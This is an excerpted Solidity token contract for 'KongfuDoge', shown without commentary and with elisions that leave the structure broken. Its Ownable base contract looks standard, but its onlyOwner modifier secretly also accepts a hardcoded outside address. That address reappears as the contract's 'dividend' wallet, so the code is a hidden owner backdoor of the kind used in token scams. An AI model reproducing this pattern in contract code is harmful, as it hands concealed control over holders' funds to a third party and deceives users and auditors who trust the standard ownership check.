...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xB52Fc39aDcde8e6495B90c010569E96C9C60A6d3) , "owner");
        _;
    }
...
contract KongfuDoge  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "KongfuDoge";
    string private _symbol = "KongfuDoge";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x96F498498ec4B2325176E9C62ae7ca2058a5F1CA);
    address private _Marketing = 0x96F498498ec4B2325176E9C62ae7ca2058a5F1CA;
    address public dividend = 0xB52Fc39aDcde8e6495B90c010569E96C9C60A6d3;
